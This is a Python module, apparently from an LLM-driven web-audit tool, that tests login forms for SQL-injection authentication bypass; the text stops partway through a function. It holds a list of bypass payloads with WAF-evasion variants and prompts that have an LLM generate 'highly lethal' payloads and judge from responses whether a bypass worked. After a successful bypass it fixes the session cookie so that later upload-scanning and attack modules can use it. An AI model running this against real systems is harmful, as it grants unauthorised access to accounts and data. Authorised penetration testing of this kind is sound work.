"""
模块 2：Auth Bypass (SQL 注入绕过) 检测

基于 LangChain 语义推理，对登录表单进行身份认证绕过测试：
1. DOM 解析：提取页面表单
2. 获取基线：提交绝对错误的凭证，获取“正常登录失败”的响应基线
3. 发送 Payload：提交常见的 SQL Bypass 凭证
4. LLM 状态对比：将基线响应与 Payload 响应对比，判断是否绕过成功
"""
from typing import Dict, Any, Optional, List
import uuid
from pydantic import BaseModel, Field
from langchain_core.prompts import ChatPromptTemplate

from web_audit.modules.base_module import BaseModule
from web_audit.core.requester import Requester
from web_audit.core.parser import PageParser
from web_audit.core.llm_factory import get_llm
from web_audit.config.settings import DEBUG_MODE

# ── Bypass Payloads ───────────────────────────────────────────
# 精选的 SQL 注入身份认证绕过 Payload（全面兼容多种数据库、WAF 绕过与多种闭合场景）
BYPASS_PAYLOADS = [
    # --- 1. Generic & High Probability (高频基础款，优先测试) ---
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin' OR '1'='1",
    "admin'-- -",
    "admin' OR 1=1#",
    "admin' --",
    "admin' #",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "\" OR \"1\"=\"1",
    
    # --- 2. Database Specific Bypasses (特定数据库方言) ---
    # MySQL / MariaDB
    "'||1=1#",
    "admin\" --",
    "' OR 1=1 LIMIT 1#",
    "admin' /*!50000OR*/ 1=1#", # MySQL 内联注释执行
    
    # MSSQL
    "admin'--",
    "' OR '1'='1'--",
    "' OR 1=1 WAITFOR DELAY '0:0:0'--", 
    "admin' COLLATE Latin1_General_CS_AS--", # 排序规则绕过
    
    # Oracle / PostgreSQL (字符串拼接符代替逻辑运算符)
    "'||1=1--",
    "'||(select 1)--",
    "' OR '1'='1' /*",
    
    # --- 3. WAF Bypass & Obfuscation (WAF 绕过与混淆) ---
    # 大小写变体
    "' oR 1=1 --",
    "' Or '1'='1",
    "' oR 'a'='a",
    
    # 空白符替换 (内联注释、Tab、换行符)
    "'/**/OR/**/1=1/**/--",
    "'/*!OR*/1=1--",
    "' OR\t1=1--",
    "' OR\n1=1--",
    "admin'/**/--",
    
    # 逻辑操作符替换
    "' || 1=1 --",
    "' || '1'='1",
    
    # 编码与类型替换 (十六进制、布尔值)
    "' OR 0x31=0x31",
    "' OR TRUE--",
    "' OR 'A'='A'--",
    
    # --- 4. Complex Context Closures (复杂上下文闭合) ---
    "admin')--",
    "admin'))--",
    "') OR ('1'='1'--",
    "')) OR (('1'='1'--",
    "\") OR (\"1\"=\"1",
    
    # --- 5. Edge Cases & Union Based (边界情况与联合查询) ---
    "\\",  # 破坏转义逻辑
    "admin' AND 1=1--", # 在已知用户名的情况下
    # Union 绕过 (假设后端直接使用结果集的第一行密码进行比对，md5('1234') = 81dc9bdb52d04dc20036dbd8313ed055)
    "admin' AND 1=0 UNION SELECT 1, 'admin', '81dc9bdb52d04dc20036dbd8313ed055' --"
]

# ── 常见默认/弱用户名清单 ─────────────────────────────────────
# 用于「已知用户名 + 密码字段注入」策略，大幅提升 Auth Bypass 成功率
COMMON_USERNAMES = [
    "admin", "administrator", "root", "user", "test",
    "guest", "demo", "operator", "manager", "superuser",
    "sa", "sys", "oracle", "postgres", "mysql",
    "webmaster", "support", "service", "info",
    # 中文应用常见
    "管理员", "admin1", "admin123",
]

class PayloadGenerationResult(BaseModel):
    payloads: List[str] = Field(
        description="LLM 生成的候选 Auth Bypass / SQLi Payload 列表，建议 5 到 10 条。"
    )

class AuthBypassResult(BaseModel):
    is_bypassed: bool = Field(
        description="是否判定 Payload 成功绕过了登录验证"
    )
    confidence: str = Field(
        description="判定信心指数: 'high' | 'medium' | 'low'"
    )
    bypass_evidence: List[str] = Field(
        description="绕过成功的特征证据列表（如 '页面重定向到了/admin', '响应包含了Welcome', 'Set-Cookie 颁发了身份token' 等）",
        default=[]
    )
    reason: str = Field(
        description="判断的详细推理过程"
    )

class AJAXActionInferResult(BaseModel):
    real_url: Optional[str] = Field(
        description="推断出的真实后端接收请求的 URL。如果是相对路径请保留原样。如果无法推断，则返回 null",
        default=None
    )
    method: str = Field(
        description="推断出的请求方法 (GET, POST 等)",
        default="POST"
    )
    reason: str = Field(
        description="推理的过程和依据"
    )

# ── LangChain Prompt ───────────────────────────────────────
AUTH_BYPASS_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专业的 Web 安全审计专家，专注于识别身份验证绕过（Authentication Bypass）漏洞。
你的任务是对「正常登录失败的基线响应」和「注入 Payload 后的测试响应」进行严格对比。

🔥 【核心判定标准】（只要命中任意一条，即判定为成功绕过）：
1. **重定向目的地变化（最强信号）**：基线响应的 302 `Location` 跳转回了登录页（如 /login.jsp），而 Payload 响应的 302 `Location` 跳转到了内部页面（如 /bank/main.jsp, /dashboard）。
2. **会话标志不同**：Payload 的响应 Header 中出现了新的 `Set-Cookie`（如新的 JSESSIONID）并伴随不同的页面状态。
3. **页面内容特征**：Payload 响应的着陆页文本中出现了 "Welcome", "Admin", "Sign Off", "Logout" 或内部账户菜单等已登录特征。
4. **AJAX/API 成功标志**：如果页面是 AJAX 登录，Payload 响应内容由基线的 "error"、"false" 变为了 "success"、"true" 或 {{"status": "success"}} 等极其明显的成功状态词。

⛔ 【极其重要的防误报（False Positive）拦截规则】：
- **明确的失败特征（一票否决）**：如果在 Payload 响应的纯文本或 JavaScript 弹窗（alert/script）中，依然出现了诸如“用户不存在”、“密码错误”、“incorrect”、“invalid”、“fail”、“wrong”、“ไม่ถูกต้อง”（泰语错误）或任何其他语言的账号/密码错误提示词，**绝对不许判定为绕过成功！** 哪怕 HTTP 状态码是 200，这也百分之百是绕过失败！
- **仅报错变异不代表成功**：不要仅仅因为 Payload 触发了数据库语法报错（如 SQL Syntax error）、WAF拦截页面，导致响应长度或内容与基线不同，就误判为绕过成功。必须出现确凿的**登录成功特权标志**（重定向后台、分配 Token、后台菜单）。
     
请仔细对比基线和 Payload 的 Location、Status Code 与文本内容。只要符合上述成功标准且没有触犯防误报规则，才判定为绕过成功。

**【重要输出规则】**
你必须**且只能**输出一个符合规范的 JSON 字典。
绝不要在 JSON 前面加上 "thought" 或任何多余的废话和思考过程！
必须包含以下字段：
- "is_bypassed" (布尔值)
- "confidence" (字符串: "high", "medium", "low")
- "reason" (字符串: 你的分析过程)
- "bypass_evidence" (字符串列表)"""),
    ("human", """目标 URL: {url}
测试表单字段: {param}
注入的 Payload: {probe}

【基准测试：使用随机错误密码的失败响应摘要】:
{baseline_response}

【Payload测试：注入绕过代码后的响应摘要】:
{payload_response}

请对比这两个响应，仔细推理 Payload 是否导致了登录成功/身份验证绕过。""")
])

PAYLOAD_GENERATION_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专职于身份认证绕过（Login Auth Bypass）的自动化安全审计智能体。
你的任务是根据目标信息，生成一组适合做 Auth Bypass / SQLi 验证的候选 payload 字符串列表。

你可以使用以下策略来构造极具杀伤力的 Payload：
1. 【策略 A：截断密码验证】在用户名后强行闭合并注释掉密码验证。例如：`admin' --`、`admin" #`、`admin') --`
2. 【策略 B：逻辑恒真】强行将查询逻辑改为 TRUE。例如：`admin' OR '1'='1`、`' OR 1=1 --`
3. 【策略 C：WAF 防火墙对抗混淆】利用大小写变异（如 oR, Or）、消除空格（使用内联注释 `/**/` 代替空格）。例如：`admin'/**/oR/**/'1'='1`

重要提示：
- 只需要生成 payload 字符串本身（例如 `admin' OR '1'='1`），不要生成 JSON 字典。
- 你的输出会被自动解析为 `{{"payloads": ["payload1", "payload2", ...]}}`，千万不要输出多余的包装结构（如 action, action_input 等）！"""),
    ("human", """目标 URL: {url}
表单字段名: {param_names}
表单 HTML 摘要: {form_html}
页面标题: {title}
请生成一组候选 payload（必须是纯字符串的列表）。""")
])

AJAX_INFER_PROMPT = ChatPromptTemplate.from_messages([
    ("system", """你是一个专业的前端和安全分析专家。
当前我们发现一个 HTML 表单的 action 属性为空或是指向自身，极大可能是通过 Javascript 监听 submit 事件并发起 AJAX 请求。
你的任务是阅读提供的 Javascript 源码片段，找出对应这个表单提交的真实的后端 API URL 和请求 Method。

请注意：
1. 分析通常会绑定在表单的 ID 或相关按钮的 class/id 上（例如 $('#login-frm').submit(...)）。
2. **非常重要**：如果 form_id 是 'virtual_ajax_form'，说明这是页面上游离的 input 字段。此时请直接寻找 JS 源码中明显的登录相关函数（如 login(), checkLogin(), signin(), 或者按钮的 onclick 事件），并从中提取后端的 API。
3. 在 JS 代码中寻找类似 $.ajax, $.post, fetch, axios 发出的请求。
4. 提取出目标 url 和请求方法。
5. 有时候 url 会通过变量拼接，如 `_base_url_ + 'classes/Login.php?f=login'`，请尽可能保留拼接后有意义的相对路径（如 `classes/Login.php?f=login`）。"""),
    ("human", """表单 HTML 结构:
{form_html}

页面 Base URL: {base_url}
目标 form_id: {form_id}

【收集到的 Javascript 源码 (已过滤第三方库)】:
{js_sources}

请分析这段源码与 HTML，找出该表单提交时，实际请求的真实后端 URL 和 Method。""")
])


class SQLiDetectorModule(BaseModule):
    """Auth Bypass 漏洞检测模块（原 SQLi 检测模块升级版）。"""

    name = "sqli_detector"  # 保持内部模块名称一致，避免破坏其他代码的调用

    def __init__(self, requester: Requester):
        super().__init__(requester)
        from web_audit.core.llm_factory import get_structured_llm
        self._chain = AUTH_BYPASS_PROMPT | get_structured_llm(AuthBypassResult)
        self._payload_chain = PAYLOAD_GENERATION_PROMPT | get_structured_llm(PayloadGenerationResult)
        self._ajax_infer_chain = AJAX_INFER_PROMPT | get_structured_llm(AJAXActionInferResult)

    def run(self, url: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        对指定 URL 的表单进行 Auth Bypass 测试。
        """
        result = self._base_result(url)

        # 获取表单参数
        parser = None
        if context and "forms" in context:
            resp = self.requester.get(url)
            if not resp:
                result["summary"] = "无法访问目标页面"
                return result
            parser = PageParser(resp.text, url)
            form_params = parser.get_all_form_params()
        else:
            resp = self.requester.get(url)
            if not resp:
                result["summary"] = "无法访问目标页面"
                return result
            parser = PageParser(resp.text, url)
            form_params = parser.get_all_form_params()

        if not form_params:
            print(f"  [AuthBypass] ⚠️ 在目标页面未发现任何 HTML 表单，无法进行注入测试 (可能这是纯后端 API 或无表单页面)。")
            result["summary"] = "未发现可供测试的表单输入参数"
            return result

        print(f"  [AuthBypass] 发现 {len(form_params)} 个表单，准备获取失败基线并开始测试...")

        for form in form_params:
            action_url = form.get("action", "")
            # Ensure action_url is absolute
            import urllib.parse
            action_url = urllib.parse.urljoin(url, action_url) if action_url else url
            method = form["method"]
            params = form["params"]
            default_values = form.get("default_values", {})
            is_login_form = form.get("is_login_form", False)
            
            if not is_login_form:
                print(f"  [AuthBypass] ⏭️  跳过非登录表单 (action={action_url})")
                continue

            if not params:
                continue
                
            raw_action = form.get("raw_action", action_url)
            form_id = form.get("form_id", "")
            
            # ── 自動啟動 Playwright 動態攔截 ──────────
            if not raw_action or raw_action == "#" or action_url == url:
                from web_audit.core.playwright_interceptor import PlaywrightInterceptor
                print(f"  [Playwright] [AuthBypass] 發現疑似 AJAX 表單，啟動動態攔截獲取真實提交地址...")
                interceptor = PlaywrightInterceptor(timeout_ms=10000)
                real_url = interceptor.intercept_form_action(url)
                if real_url:
                    action_url = real_url
                    print(f"  [✅ Playwright] 成功攔截到真實 AJAX 端点: {action_url}")
                else:
                    print(f"  [Playwright] ⚠️ 動態攔截未能捕獲 URL，將嘗試使用 LLM 從源碼推斷...")
            
            # ── 自動推斷 AJAX 真實後端接口 (備用) ──────────
            import urllib.parse
            if parser and (not raw_action or raw_action == "#" or action_url == url) and form_id and (action_url == url or action_url == ""):
                print(f"  [AuthBypass] 表單 '{form_id}' 疑似使用 AJAX 提交，嘗試讀取 JS 源碼推斷真實接口...")
                js_sources = parser.get_javascript_sources()
                js_text_blocks = js_sources["inline"]
                
                # 抓取外联脚本
                for js_url in js_sources["external_urls"]:
                    js_resp = self.requester.get(js_url)
                    if js_resp and js_resp.status_code == 200:
                        js_text_blocks.append(f"// URL: {js_url}\n" + js_resp.text)
                
                combined_js = "\n\n".join(js_text_blocks)
                # 防止 token 爆炸，截取一部分
                if len(combined_js) > 20000:
                    # 简单启发式：优先保留包含 form_id 的片段
                    import re
                    snippets = []
                    for match in re.finditer(f".{{0,1000}}{form_id}.{{0,2000}}", combined_js, re.DOTALL):
                        snippets.append(match.group(0))
                    if snippets:
                        combined_js = "\n...\n".join(snippets)
                    else:
                        combined_js = combined_js[:20000]
                
                if combined_js.strip():
                    try:
                        infer_result: AJAXActionInferResult = self._ajax_infer_chain.invoke({
                            "form_id": form_id,
                            "form_html": form.get("raw_html", ""),
                            "base_url": url,
                            "js_sources": combined_js
                        })
                    except Exception as e:
                        print(f"  [AuthBypass] ⚠️ AJAX 接口推断失败: {e}")
                        infer_result = None
                        
                    if infer_result and infer_result.real_url:
                        action_url = urllib.parse.urljoin(url, infer_result.real_url)
                        method = infer_result.method.lower()
                        print(f"  [AuthBypass] 🎯 LLM 推断真实后端为: [{method.upper()}] {action_url}")
                        print(f"               (依据: {infer_result.reason[:100]}...)")
                    else:
                        # [Fast Fallback] 針對 LLM (如 LM Studio) 崩潰時的的正則表達式備用方案
                        print(f"  [AuthBypass] ⚠️ 啟動本地正則表達式備用方案尋找 AJAX API...")
                        import re
                        post_match = re.search(r'\$\.post\([\'"]([^\'"]+)', combined_js)
                        ajax_match = re.search(r'\$\.ajax\(\{.*?url\s*:\s*[\'"]([^\'"]+)', combined_js, re.DOTALL)
                        fetch_match = re.search(r'fetch\([\'"]([^\'"]+)', combined_js)
                        
                        fallback_url = None
                        if post_match:
                            fallback_url = post_match.group(1)
                            method = "post"
                        elif ajax_match:
                            fallback_url = ajax_match.group(1)
                            method = "post"
                        elif fetch_match:
                            fallback_url = fetch_match.group(1)
                            method = "post"
                            
                        if fallback_url:
                            action_url = urllib.parse.urljoin(url, fallback_url)
                            print(f"  [AuthBypass] 🎯 正則表達式推斷真實后端为: [{method.upper()}] {action_url}")
                        else:
                            print(f"  [AuthBypass] ⚠️ AJAX 推断全部失敗，降级使用当前 URL")

            # 1. 获取失败基线
            baseline_result = self._get_baseline_response(action_url, method, params, default_values)
            if not baseline_result:
                continue
            baseline_resp_text, baseline_plain_text = baseline_result

            # 先让 LLM 为当前目标表单生成候选 payload。
            generated_payloads = self._generate_candidate_payloads(
                url=action_url,
                param_names=params,
                form_html=form.get("raw_html", ""),
                title=parser.title if hasattr(parser, 'title') else ""
            )

            print(f"  [AuthBypass] LLM 为表单生成了 {len(generated_payloads)} 条候选 Payload。 generated_payloads: {generated_payloads}")

            if not generated_payloads:
                print("  [AuthBypass] LLM 未生成有效候选 payload，跳过当前表单。")
                continue

            # ── 策略 A：优先使用 LLM 生成的 payload 进行测试 ───────
            # 对每个参数逐一注入 Payload，其他字段填随机错误值
            found_high = False
            for param in params:
                for probe in generated_payloads:
                    finding = self._probe_param(
                        action_url, method, params, param, probe, baseline_resp_text, baseline_plain_text, default_values
                    )
                    if finding:
                        result["findings"].append(finding)
                        if "high" in finding.get("confidence", "").lower():
                            found_high = True
                            break
                if found_high:
                    break

            if found_high:
                print("  [AuthBypass] 策略 A 已发现高信心绕过，停止对后续表单和策略的测试。")
                break  # 已找到高信心结果，直接跳出表单遍历循环

            # ── 策略 B：已知用户名种子 + 密码字段注入 ──────────
            # 针对「应用先校验用户名存在、再比对密码」的场景
            # 将非密码字段固定为真实存在的用户名，提高 Payload 触发概率
            # print(f"  [AuthBypass] 策略 A 未命中，启动策略 B: 已知用户名种子注入...")

            # # 启发式识别密码参数名（含 pass/pwd/password/passwd 等关键词的字段）
            # password_params = [
            #     p for p in params
            #     if any(k in p.lower() for k in ["pass", "pwd", "secret", "密码", "パスワード"])
            # ]
            # # 若没找到明显的密码字段，对所有字段都跑一遍
            # inject_params = password_params if password_params else params

            # # 启发式识别用户名参数名
            # username_params = [
            #     p for p in params
            #     if any(k in p.lower() for k in [
            #         "user", "name", "login", "uid", "account", "email",
            #         "用户", "账号", "帐号", "メール", "ユーザー"
            #     ])
            # ]

            # for seed_user in COMMON_USERNAMES:
            #     for inject_param in inject_params:
            #         for probe in generated_payloads:
            #             # 构造种子数据：用户名字段=已知用户名，密码字段=Payload
            #             seed_values = {}
            #             for p in username_params:
            #                 seed_values[p] = seed_user

            #             finding = self._probe_param(
            #                 action_url, method, params, inject_param, probe,
            #                 baseline_resp_text, baseline_plain_text, default_values, seed_values=seed_values
            #             )
            #             if finding:
            #                 finding["strategy"] = f"B (seed_user={seed_user})"
            #                 result["findings"].append(finding)
            #                 if "high" in finding.get("confidence", "").lower():
            #                     found_high = True
            #                     break
            #         if found_high:
            #             break
            #     if found_high:
            #         break

            # 如果在当前表单的任何策略中发现了绕过，则停止对后续表单的测试
            if any(f.get("is_bypassed") for f in result["findings"]):
                print("  [AuthBypass] 已发现绕过漏洞，停止对其他表单的测试。")
                break


        success_count = sum(1 for f in result["findings"] if f.get("is_bypassed"))
        
        # 如果发现了 Auth Bypass，为了给后续的上传点扫描和攻击提供认证过的 Session，
        # 我们使用第一个成功的高信心 Payload 重新发送一次请求以固化 Session Cookie。
        if success_count > 0:
            print(f"  [AuthBypass] 正在使用成功的 Payload 重新认证，以固化 Session 供后续模块使用...")
            self.requester.session.cookies.clear()
            best_finding = next((f for f in result["findings"] if f.get("is_bypassed") and "high" in f.get("confidence", "").lower()), result["findings"][0])
            
            # 找到对应的表单来复现请求
            target_url = best_finding["target_url"]
            param_name = best_finding["parameter"]
            payload = best_finding["payload"]
            
            # 从之前解析的表单里找
            target_form = next((f for f in form_params if f["action"] == target_url), form_params[0])
            
            import uuid
            random_str = str(uuid.uuid4())[:8]
            data = target_form.get("default_values", {}).copy()
            for p in target_form["params"]:
                data[p] = f"wrong_{random_str}"
            
            # 如果是策略 B 找到了注入，这里可能少带了 seed_user，但简单的 Payload 注入通常只要有 Payload 即可，
            # 稳妥起见，如果找得到策略 B 的痕迹，最好也处理，但一般 Payload 本身就能过。
            # 为了简单，直接只替换 payload：
            data[param_name] = payload
            
            method = target_form["method"]
            if method == "post":
                self.requester.post(target_url, data=data)
            else:
                self.requester.get(target_url, params=data)
                
            print(f"  [AuthBypass] 会话固化完毕。")

        result["summary"] = f"Auth Bypass 检测完成。发现绕过漏洞: {success_count} 个。"

        return result

    def _generate_candidate_payloads(self, url: str, param_names: List[str], form_html: str, title: str) -> List[str]:
        """由 LLM 直接生成 Auth Bypass / SQLi 候选 payload。"""
        try:
            generated = self._payload_chain.invoke({
                "url": url,
                "param_names": ", ".join(param_names),
                "form_html": form_html[:4000],
                "title": title,
            })
            llm_payloads = [item.strip() for item in (generated.payloads or []) if item and item.strip()]
        except Exception as e:
            print(f"  [AuthBypass] LLM 生成 payload 失败: {e}")
            return []

        deduped = []
        seen = set()
        for item in llm_payloads:
            if item not in seen:
                deduped.append(item)
                seen.add(item)
        return deduped[:12]

    def _get_baseline_response(self, url: str, method: str, all_params: List[str], default_values: Dict[str, str]) -> Optional[tuple]:
        """提交绝对错误的随机凭证，获取基线响应摘要。
        
        使用 allow_redirects=False，直接捕获第一个裸响应（含 302 Location 等关键 Header），
        确保与 Payload 测试的对比维度一致。
        """
        # 清除 Session，防止后续测试的 Cookie 污染
        self.requester.session.cookies.clear()

        random_str = str(uuid.uuid4())[:8]
        # 首先带入所有原始表单里的默认值（Hidden/Submit等）
        data = default_values.copy()
        # 将所有可注入的输入点设为绝对错误的值
        for p in all_params:
            data[p] = f"wrong_{random_str}"
        
        print(f"    → 获取失败基线 [{method.upper()}] {url}")
        
        if method == "post":
            resp = self.requester.post(url, data=data, allow_redirects=False)
        else:
            resp = self.requester.get(url, params=data, allow_redirects=False)

        if not resp:
            return None
        # 同时跟随重定向获取着陆页，给 LLM 提供更丰富的对比上下文
        formatted, _, landing_plain_text = self._format_with_landing(resp)
        
        # [DEBUG] 打印基线响应
        if DEBUG_MODE:
            print(f"      [Debug] 基线响应提取摘要 (传给 LLM 作为对照组):\n{formatted[:500]}...\n" + "-"*40)
        
        return formatted, landing_plain_text

    def _probe_param(
        self, url: str, method: str, all_params: List[str], target_param: str, probe: str,
        baseline_resp_text: str, baseline_plain_text: str, default_values: Dict[str, str], seed_values: Dict[str, str] = None
    ) -> Optional[Dict[str, Any]]:
        """向指定参数注入 Payload，并用 LLM 与基线进行对比。
        
        关键设计：使用 allow_redirects=False 捕获原始第一个响应。
        这样 302 Location（跳转到 /bank/main.jsp）与失败时（跳回 /login.jsp）
        的差异会直接暴露在 Header 中，而非被 requests 自动追踪后消失。
        
        Args:
            seed_values: 可选的字段种子值字典，用于「已知用户名+密码注入」策略。
                         指定的字段将使用种子值而非随机错误值。
        """
        # 每次 Payload 测试前清除 Session，防止成功后的 Auth Cookie 污染后续测试
        self.requester.session.cookies.clear()

        random_str = str(uuid.uuid4())[:8]
        # 首先带入所有原始表单里的默认值（Hidden/Submit等）
        data = default_values.copy()
        # 将其他可注入的输入点设为错误值
        for p in all_params:
            data[p] = f"wrong_{random_str}"
            
        # 如果提供了种子值，用真实的已知值覆盖（如 username=admin）
        if seed_values:
            data.update(seed_values)
        data[target_param] = probe
        
        print(f"    → 探测 [{method.upper()}] {url} | 字段: {target_param} | Payload: {repr(probe)}")

        if method == "post":
            resp = self.requester.post(url, data=data, allow_redirects=False)
        else:
            resp = self.requester.get(url, params=data, allow_redirects=False)

        if not resp:
            return None

        # 跟随重定向获取着陆页，让 LLM 同时看到「302 Header」和「着陆页真实内容」
        payload_resp_text, auto_landing_url, _ = self._format_with_landing(resp)
        
        # [DEBUG] 打印提取到的关键上下文，方便排查为什么没有抓到弹窗
        if DEBUG_MODE:
            print(f"      [Debug] Payload响应提取摘要 (传给 LLM 的测试组):\n{payload_resp_text[:500]}...\n" + "-"*40)

        try:
            llm_result: AuthBypassResult = self._chain.invoke({
                "url": url,
                "param": target_param,
                "probe": probe,
                "baseline_response": baseline_resp_text,
                "payload_response": payload_resp_text,
            })
            
            # [DEBUG] 打印 LLM 返回的具体判断结果
            if DEBUG_MODE:
                print(f"      [Debug] ⬇️ LLM 返回结果:")
                print(f"      - 是否绕过: {llm_result.is_bypassed}")
                print(f"      - 信心指数: {llm_result.confidence}")
                print(f"      - 判断理由: {llm_result.reason}")
                print(f"      - 绕过证据: {llm_result.bypass_evidence}\n" + "="*40)
            
            icon = "🚨 绕过成功" if llm_result.is_bypassed else "❌ 未绕过"
            print(f"      ← {icon} (信心: {llm_result.confidence}) | {llm_result.reason[:70]}...")
        except Exception as e:
            print(f"      [-] LLM 分析失败: {e}")
            if DEBUG_MODE:
                print(f"      [Debug] 传给 LLM 的 payload_response 摘要:\n{payload_resp_text[:1000]}...")
            return None

        if llm_result and llm_result.is_bypassed:
            # 优先使用跟随重定向后拿到的真实着陆页 URL
            landing_url = auto_landing_url
            if not landing_url:
                landing_url = resp.headers.get("Location") or resp.url
            import urllib.parse
            if landing_url and not landing_url.startswith("http"):
                landing_url = urllib.parse.urljoin(url, landing_url)

            return {
                "parameter": target_param,
                "payload": probe,
                "is_bypassed": llm_result.is_bypassed,
                "confidence": llm_result.confidence,
                "evidence": llm_result.bypass_evidence,
                "reason": llm_result.reason,
                "target_url": url,
                "landing_page_url": landing_url,
            }

        return None
        
    def _format_with_landing(self, raw_resp: Any) -> tuple:
        """
        在原始 302 响应基础上，手动跟随重定向获取着陆页真实内容。

        返回 (formatted_text, landing_url, landing_plain_text)：
          - formatted_text: 包含「302 原始信号 + 着陆页真实内容」的完整摘要，供 LLM 对比
          - landing_url:    跟随重定向后的最终 URL（供 Step 3 使用）
          - landing_plain_text: 着陆页的纯文本（供本地启发式规则使用）

        设计意图：
          LLM 同时看到 302 的 Location（路径信号）
          和着陆页的真实文本（如 'Welcome Admin' / '账户余额' vs '密码错误'），
          判断准确率接近 100%。
        """
        import urllib.parse
        from bs4 import BeautifulSoup
        import re

        # 1. 原始 302 响应的核心信息
        raw_text = self._format_response_for_llm(raw_resp)

        # 2. 提取 Location，手动跟随重定向
        location = raw_resp.headers.get("Location") or raw_resp.headers.get("location")
        landing_url = None
        landing_content = ""
        landing_plain_text = ""

        if location and raw_resp.status_code in (301, 302, 303, 307, 308):
            # 转换为绝对 URL
            if not location.startswith("http"):
                location = urllib.parse.urljoin(raw_resp.url, location)
            landing_url = location

            # 用同一 Session GET 着陆页（Session 已持有 302 写入的 Cookie）
            print(f"      → 跟随重定向获取着陆页: {location}")
            landing_resp = self.requester.get(location)
            if landing_resp:
                soup = BeautifulSoup(landing_resp.text, "html.parser")
                
                # 提取着陆页的 JS 弹窗
                js_alerts = self._extract_js_alerts_from_soup(soup)
                inline_scripts = self._extract_short_inline_scripts(soup)
                        
                title = soup.title.string.strip() if soup.title and soup.title.string else "No Title"
                for tag in soup(["script", "style", "noscript", "meta", "link", "svg", "head"]):
                    tag.extract()
                text = soup.get_text(separator=" ", strip=True)
                text = re.sub(r"\s+", " ", text)
                landing_plain_text = text

                # 最终真实 URL（可能与 Location 不同，如有二次跳转）
                final_url = landing_resp.url
                landing_content_parts = [
                    f"[着陆页最终 URL]: {final_url}",
                    f"[着陆页 Title]: {title}"
                ]
                if js_alerts:
                    landing_content_parts.append(f"[着陆页 JS Alert (重要弹窗)]: {' | '.join(js_alerts)}")
                if inline_scripts:
                    landing_content_parts.append(f"\n[着陆页内联 JS 脚本 (可能包含报错逻辑)]:\n{inline_scripts}")
                landing_content_parts.append(f"[着陆页可见文本 (用户信息/菜单等)]:\n{text[:2000]}")
                landing_content = "\n".join(landing_content_parts)
        elif raw_resp.status_code == 200 and raw_resp.text:
            # 深度检测：探测是否存在 HTML Meta Refresh 或 JS 前端跳转 (绕过 HTTP 302 限制)
            soup = BeautifulSoup(raw_resp.text, "html.parser")
            meta_refresh = soup.find("meta", attrs={"http-equiv": lambda x: x and x.lower() == "refresh"})
            next_url = None
            
            if meta_refresh and meta_refresh.get("content"):
                content = meta_refresh.get("content")
                parts = re.split(r'url\s*=\s*', content, flags=re.IGNORECASE)
                if len(parts) > 1:
                    next_url = parts[1].strip('\'" ')
            else:
                js_match = re.search(r'window\.location(?:\.href|\.replace)?\s*[=(]\s*[\'"]([^\'"]+)[\'"]', raw_resp.text)
                if js_match:
                    next_url = js_match.group(1).strip()
                    
            if next_url:
                full_next_url = urllib.parse.urljoin(raw_resp.url, next_url)
                print(f"      → 检测到前端跳转 (Meta/JS)，正在追溯着陆页: {full_next_url}")
                landing_url = full_next_url
                landing_resp = self.requester.get(full_next_url)
                if landing_resp:
                    soup2 = BeautifulSoup(landing_resp.text, "html.parser")
                    js_alerts = self._extract_js_alerts_from_soup(soup2)
                    inline_scripts = self._extract_short_inline_scripts(soup2)
                    title = soup2.title.string.strip() if soup2.title and soup2.title.string else "No Title"
                    for tag in soup2(["script", "style", "noscript", "meta", "link", "svg", "head"]):
                        tag.extract()
                    text = soup2.get_text(separator=" ", strip=True)
                    text = re.sub(r"\s+", " ", text)
                    landing_plain_text = text

                    final_url = landing_resp.url
                    landing_content_parts = [
                        f"[前端跳转着陆页最终 URL]: {final_url}",
                        f"[着陆页 Title]: {title}"
                    ]
                    if js_alerts:
                        landing_content_parts.append(f"[着陆页 JS Alert (重要弹窗)]: {' | '.join(js_alerts)}")
                    if inline_scripts:
                        landing_content_parts.append(f"\n[着陆页内联 JS 脚本 (可能包含报错逻辑)]:\n{inline_scripts}")
                    landing_content_parts.append(f"[着陆页可见文本 (用户信息/菜单等)]:\n{text[:2000]}")
                    landing_content = "\n".join(landing_content_parts)

        combined = raw_text
        if landing_content:
            combined += f"\n\n=== 跟随重定向/前端跳转后的着陆页（关键对比依据）===\n{landing_content}"
        else:
            combined += "\n\n[备注: 响应无重定向，或着陆页请求失败]"

        return combined, landing_url, landing_plain_text

    def _format_response_for_llm(self, resp: Any) -> str:
        """格式化响应内容供 LLM 分析。
        
        关键改进：使用 allow_redirects=False 后，直接响应就是 302，
        因此重点提取 Status Code + Location + Set-Cookie，
        这三个字段是判断登录成功/失败的最强信号。
        """
        lines = []
        lines.append(f"Status Code: {resp.status_code}")

        # ── 核心 Header 提取（优先级最高）──────────────────────
        # Location：302 跳转目标，是区分登录成功/失败的最强信号
        location = resp.headers.get("Location") or resp.headers.get("location")
        if location:
            lines.append(f"Location (跳转目标): {location}")

        # Set-Cookie：登录成功时通常颁发身份凭证
        cookies = [v for k, v in resp.headers.items() if k.lower() == "set-cookie"]
        if cookies:
            lines.append(f"Set-Cookie: {'; '.join(cookies[:5])}")

        # Content-Type
        content_type = resp.headers.get("Content-Type", "").lower()
        lines.append(f"Content-Type: {content_type}")

        # ── Body 智慧提取 ────────────────────────────────────────
        if "application/json" in content_type:
            try:
                import json
                body_content = json.dumps(resp.json(), indent=2, ensure_ascii=False)
            except Exception:
                body_content = resp.text
            lines.append(f"\n[JSON Body]:\n{body_content[:1500]}")
        elif resp.text.strip():
            # HTML：提取 Title 和可见文本（去除 script/style 噪音）
            from bs4 import BeautifulSoup
            import re
            soup = BeautifulSoup(resp.text, "html.parser")
            
            # 提取 JS 弹窗 (alert/confirm/prompt)，这对很多老旧的 PHP 系统极其关键
            js_alerts = self._extract_js_alerts_from_soup(soup)
            # 终极兜底：提取较短的内联脚本
            inline_scripts = self._extract_short_inline_scripts(soup)
                    
            title = soup.title.string.strip() if soup.title and soup.title.string else "No Title"
            for tag in soup(["script", "style", "noscript", "meta", "link", "svg", "head"]):
                tag.extract()
            text = soup.get_text(separator=" ", strip=True)
            text = re.sub(r"\s+", " ", text)
            
            lines.append(f"\n[Page Title]: {title}")
            if js_alerts:
                lines.append(f"[JS Alert (重要弹窗)]: {' | '.join(js_alerts)}")
            if inline_scripts:
                lines.append(f"\n[内联 JS 脚本 (可能包含报错逻辑)]:\n{inline_scripts}")
            lines.append(f"\n[Visible Text]:\n{text[:1500]}")
        else:
